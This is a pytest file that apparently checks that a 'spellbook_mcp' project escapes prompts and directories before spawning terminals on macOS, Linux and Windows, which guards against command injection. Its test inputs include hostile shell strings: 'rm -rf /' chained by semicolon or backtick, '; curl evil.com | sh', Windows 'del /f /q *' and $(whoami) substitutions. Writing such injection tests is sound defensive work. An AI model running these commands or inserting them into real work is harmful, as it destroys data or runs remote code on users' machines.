"""Tests for terminal command injection prevention (Phase 2: Terminal Injection Cluster).

Covers:
- Task 5: AppleScript/shell escaping in terminal spawn functions (Finding #8)
"""

import shlex
import subprocess
import pytest
from unittest.mock import patch, MagicMock

from spellbook_mcp.terminal_utils import _escape_for_applescript


def _expected_macos_applescript(terminal_type: str, prompt: str, wd: str, cli: str) -> str:
    """Build the expected AppleScript for a given terminal type and inputs.

    This mirrors the production logic: shlex.quote all inputs, build the shell
    command, then AppleScript-escape the result for embedding in a double-quoted
    AppleScript string.
    """
    safe_prompt = shlex.quote(prompt)
    safe_wd = shlex.quote(wd)
    safe_cli = shlex.quote(cli)
    command = f"cd {safe_wd} && {safe_cli} {safe_prompt}"
    as_command = _escape_for_applescript(command)

    if terminal_type == "iterm2":
        return f'''
tell application "iTerm2"
    create window with default profile
    tell current session of current window
        write text "{as_command}"
    end tell
end tell
'''
    elif terminal_type == "warp":
        return f'''
tell application "Warp"
    activate
    tell application "System Events"
        keystroke "t" using {{command down}}
        delay 0.5
        keystroke "{as_command}"
        keystroke return
    end tell
end tell
'''
    else:  # terminal (Terminal.app)
        return f'''
tell application "Terminal"
    do script "{as_command}"
    activate
end tell
'''


def _expected_linux_command(terminal: str, prompt: str, wd: str, cli: str) -> list:
    """Build the expected command list for a given Linux terminal and inputs.

    Mirrors the production logic: shlex.quote all inputs, build the bash -c string.
    """
    safe_prompt = shlex.quote(prompt)
    safe_wd = shlex.quote(wd)
    safe_cli = shlex.quote(cli)
    command = f"cd {safe_wd} && {safe_cli} {safe_prompt}; exec bash"

    if terminal == "gnome-terminal":
        return ["gnome-terminal", "--", "bash", "-c", command]
    elif terminal == "konsole":
        return ["konsole", "-e", "bash", "-c", command]
    elif terminal == "xterm":
        return ["xterm", "-e", "bash", "-c", command]
    elif terminal == "terminator":
        return ["terminator", "-e", f"bash -c {shlex.quote(command)}"]
    elif terminal == "alacritty":
        return ["alacritty", "-e", "bash", "-c", command]
    else:
        return [terminal, "-e", "bash", "-c", command]


class TestAppleScriptEscaping:
    """AppleScript command construction must prevent injection via shlex.quote."""

    def test_subshell_in_prompt_is_escaped(self):
        """A prompt containing $(cmd) must be wrapped in shlex.quote single quotes."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "$(echo pwned)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}

    def test_semicolon_in_prompt_is_escaped(self):
        """A prompt containing semicolons must be shlex-quoted, preventing command chaining."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = '"; rm -rf / #'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}

    def test_backtick_in_prompt_is_escaped(self):
        """Backtick command substitution must be neutralized by shlex.quote."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "`rm -rf /`"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}

    def test_working_directory_is_escaped(self):
        """working_directory with shell metacharacters must be shlex-quoted."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        malicious_wd = '/tmp/$(whoami)'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt="hello",
                working_directory=malicious_wd,
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", "hello", malicious_wd, "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}

    def test_iterm2_uses_escaped_command(self):
        """iTerm2 AppleScript must use the escaped command in write text."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "$(whoami)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=5678)
            result = spawn_macos_terminal(
                terminal="iTerm2",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("iterm2", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "iTerm2", "pid": 5678}

    def test_warp_uses_escaped_command(self):
        """Warp AppleScript must use the escaped command in keystroke."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "; curl evil.com | sh"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=9999)
            result = spawn_macos_terminal(
                terminal="Warp",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("warp", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "Warp", "pid": 9999}

    def test_popen_called_with_osascript(self):
        """subprocess.Popen must be called with ['osascript', '-e', script]."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            spawn_macos_terminal(
                terminal="terminal",
                prompt="safe prompt",
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            expected_applescript = _expected_macos_applescript("terminal", "safe prompt", "/tmp", "claude")
            assert osascript_cmd == ["osascript", "-e", expected_applescript]
            assert call_args[1] == {"stdout": subprocess.PIPE, "stderr": subprocess.PIPE}
            assert mock_popen.call_count == 1


class TestLinuxTerminalEscaping:
    """Linux terminal command construction must use shlex.quote."""

    def test_prompt_is_shell_escaped_gnome(self):
        """User prompt must be escaped with shlex.quote for gnome-terminal bash -c."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        prompt = "$(echo pwned)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="gnome-terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("gnome-terminal", prompt, "/tmp", "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "gnome-terminal", "pid": 1234}

    def test_working_directory_is_shell_escaped_linux(self):
        """working_directory must be shlex.quote'd in bash -c command."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        malicious_wd = "/tmp/$(id)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="xterm",
                prompt="hello",
                working_directory=malicious_wd,
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("xterm", "hello", malicious_wd, "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "xterm", "pid": 1234}

    def test_semicolon_in_prompt_escaped_linux(self):
        """Semicolons in prompt must be neutralized by shlex.quote."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        prompt = "; rm -rf / ;"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="konsole",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("konsole", prompt, "/tmp", "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "konsole", "pid": 1234}

    def test_terminator_double_escapes_command(self):
        """Terminator wraps the bash -c arg in shlex.quote for its -e flag."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        prompt = "$(evil)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="terminator",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("terminator", prompt, "/tmp", "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "terminator", "pid": 1234}


class TestWindowsTerminalEscaping:
    """Windows terminal command construction must use subprocess.list2cmdline."""

    def test_prompt_with_special_chars_wt(self):
        """Prompt with special characters must be properly escaped for Windows Terminal."""
        from spellbook_mcp.terminal_utils import spawn_windows_terminal

        prompt = 'test & del /f /q *'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_windows_terminal(
                terminal="windows-terminal",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]
            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])

            expected_cmd = ["wt", "-d", "C:\\Users\\test", "cmd", "/c", safe_cli_prompt]
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "windows-terminal", "pid": 1234}

    def test_prompt_with_special_chars_pwsh(self):
        """Prompt with special characters must be properly escaped for PowerShell."""
        from spellbook_mcp.terminal_utils import spawn_windows_terminal

        prompt = 'test & del *'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_windows_terminal(
                terminal="pwsh",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]
            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])

            expected_cmd = ["pwsh", "-NoExit", "-Command",
                           f"Set-Location 'C:\\Users\\test'; {safe_cli_prompt}"]
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "pwsh", "pid": 1234}

    def test_prompt_with_special_chars_cmd(self):
        """Prompt with special characters must be properly escaped for cmd."""
        from spellbook_mcp.terminal_utils import spawn_windows_terminal

        prompt = 'test & del *'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_windows_terminal(
                terminal="cmd",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]
            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])

            expected_cmd = ["cmd", "/c", "start", "cmd", "/k",
                           f'cd /d "C:\\Users\\test" && {safe_cli_prompt}']
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "cmd", "pid": 1234}
